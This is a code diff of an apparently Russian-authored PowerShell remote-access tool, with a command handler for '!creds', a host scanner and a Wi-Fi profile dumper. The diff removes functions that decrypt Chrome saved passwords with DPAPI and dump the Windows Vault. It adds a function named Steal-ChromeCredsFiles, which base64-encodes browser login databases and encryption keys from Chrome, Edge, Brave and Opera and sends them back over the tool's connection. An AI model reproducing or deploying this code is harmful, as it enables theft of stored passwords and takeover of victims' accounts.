@@ -391,172 +391,38 @@ function PortSuggest {
 
 
 
-
-
-
-
-
-function Get-Credentials {
-    try {
-        $output = ""
-
-        # Windows Credential Manager (только цели)
-        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
-            $target = $_.ToString().Split(":")[1].Trim()
-            $output += "`n[TARGET] $target"
+    function Steal-ChromeCredsFiles {
+        $browsers = @{
+            "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+            "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+            "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
+            "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
         }
-
-        # Chrome Login Data путь
-        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromeLoginPath) {
-            $output += "`n[+] Chrome login database found: $chromeLoginPath"
-        }
-
-        # Firefox профили
-        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
-        foreach ($profile in $firefoxProfiles) {
-            $output += "`n[+] Firefox profile: $($profile.FullName)"
-        }
-
-        if ([string]::IsNullOrWhiteSpace($output)) {
-            return "[INFO] No credentials found or access denied."
-        }
-
-        return $output
-    }
-    catch {
-        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
-    }
-}
-function Decrypt-ChromePasswords {
-    try {
-        Add-Type -AssemblyName System.Security
-
-        $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
-        $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-
-        if (!(Test-Path $loginData) -or !(Test-Path $localState)) {
-            return "[INFO] Chrome login data or local state not found"
-        }
-
-        # Извлекаем и расшифровываем ключ
-        $localStateContent = Get-Content $localState -Raw
-        $encryptedKey = ($localStateContent | ConvertFrom-Json).os_crypt.encrypted_key
-        $encryptedKey = [Convert]::FromBase64String($encryptedKey)[5..-1]  # Пропускаем "DPAPI"
-        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
-
-        # Копируем базу
-        $tempDB = "$env:TEMP\chrome_logins.db"
-        Copy-Item $loginData $tempDB -Force
-
-        # Подключение к базе
-        $conn = New-Object -ComObject ADODB.Connection
-        $conn.Open("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=$tempDB")
-        $cmd = New-Object -ComObject ADODB.Command
-        $cmd.ActiveConnection = $conn
-        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-        $rs = $cmd.Execute()
-
-        $results = ""
-        while (!$rs.EOF) {
-            $url = $rs.Fields.Item("origin_url").Value
-            $username = $rs.Fields.Item("username_value").Value
-            $encPass = $rs.Fields.Item("password_value").Value
-            $pass = "[Empty]"
-
-            try {
-                if ($encPass -and $encPass.Length -gt 15) {
-                    $encBytes = $encPass[15..($encPass.Length - 1)]
-                    $passBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encBytes, $null, 'CurrentUser')
-                    $pass = [System.Text.Encoding]::UTF8.GetString($passBytes)
-                } elseif ($encPass.Length -le 15) {
-                    $pass = "[Too short]"
-                }
-            } catch {
-                $pass = "[Decrypt Error] $($_.Exception.Message)"
-            }
-
-            $results += "`n[$url] $username / $pass"
-            $rs.MoveNext()
-        }
-
-        $conn.Close()
-        Remove-Item $tempDB -Force
-        return $results
-    }
-    catch {
-        return "[ERROR] Chrome decrypt failed: $($_.Exception.Message)"
-    }
-}
-
-
-function Dump-WindowsVault {
-    try {
-        Add-Type -AssemblyName System.Security
-        $vault = New-Object -ComObject "VaultCli.Vault"
-        $items = $vault.GetVaults() | ForEach-Object {
-            $_.GetItems() | ForEach-Object {
-                try {
-                    $user = $_.Credential.UserName
-                    $pass = $_.Credential.Password
-                    "[VAULT] $user / $pass"
-                } catch {}
+    
+        $result = ""
+    
+        foreach ($name in $browsers.Keys) {
+            $base = $browsers[$name]
+            $loginData = Join-Path $base "Login Data"
+            $localState = Join-Path (Split-Path $base -Parent) "Local State"
+    
+            if ((Test-Path $loginData) -and (Test-Path $localState)) {
+                $loginB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($loginData))
+                $stateB64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($localState))
+    
+                $result += "`n[$name]::LoginData::$loginB64::LocalState::$stateB64::END"
             }
         }
-        return ($items -join "`n")
+    
+        if ($result) {
+            return $result
+        } else {
+            return "[ERROR] No browser credential files found"
+        }
     }
-    catch {
-        return "[INFO] Vault access failed or not available on this system."
-    }
-}
-function Get-CredentialsFull {
-    try {
-        Add-Type -AssemblyName System.Security  # Обязательно для DPAPI
-
-        $tempPath = "$env:TEMP\creds_dump.txt"
-
-        $output = "`n[*] Windows Credential Manager:`n"
-        $output += (Get-Credentials)
-
-        $output += "`n[*] Chrome Stored Logins:`n"
-        $output += (Decrypt-ChromePasswords)
-
-        $output += "`n[*] Windows Vault:`n"
-        $output += (Dump-WindowsVault)
-
-        # Сохраняем в файл (на всякий случай)
-        $output | Out-File -FilePath $tempPath -Encoding UTF8 -Force
-
-        # Возвращаем сразу в терминал клиента
-        return $output
-    }
-    catch {
-        return "[ERROR] Credential dump failed: $($_.Exception.Message)"
-    }
-}
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    
     
     function Dump-WiFi {
     netsh wlan show profiles | ForEach-Object {
@@ -772,7 +638,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST 5553FF                                                                                                                                                                    
+                                            TEST 4                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
@@ -831,7 +697,7 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $response = Get-CredentialsFull
+                        $response = Get-Credentials
                     }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
